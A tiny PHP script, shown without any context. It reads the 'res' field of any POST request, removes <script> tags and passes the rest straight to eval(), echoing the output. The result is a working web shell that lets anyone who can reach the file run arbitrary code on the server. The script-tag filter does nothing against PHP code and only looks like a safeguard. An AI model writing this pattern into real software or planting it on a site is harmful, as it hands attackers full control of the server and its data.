<?php
if ($_POST) {
    $str = $_POST["res"];
    $str = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $str);
    echo eval($str);
}

